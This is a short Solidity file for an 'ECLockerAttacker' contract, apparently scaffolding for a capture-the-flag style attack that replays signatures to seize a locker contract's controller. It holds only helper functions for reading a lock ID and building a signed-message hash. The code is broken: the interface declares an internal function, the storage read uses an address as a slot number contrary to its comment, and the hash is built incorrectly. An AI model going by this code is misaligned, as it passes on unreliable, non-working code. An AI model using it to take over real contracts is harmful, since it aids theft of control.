pragma solidity ^0.8.0; interface ReusedLocker { function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external; function _isValidSignature(uint8 v, bytes32 r, bytes32 s) internal view returns (address); } contract ECLockerAttacker { address public instance; constructor(address _instance) { instance = _instance; } function findLockerAddress() public view returns (address) { return instance; } function getlockerid(address locker) public view returns (uint256) { uint256 id; // Assume locker's lockId is stored at slot 0 assembly { id := sload(locker) } return id; } function computeMessageHash(uint256 id) public view returns (bytes32) { bytes32 prefixHash = keccak256('\x19Ethereum Signed Message:\n32'); return keccak256(abi.encodePacked(prefixHash, id)); } }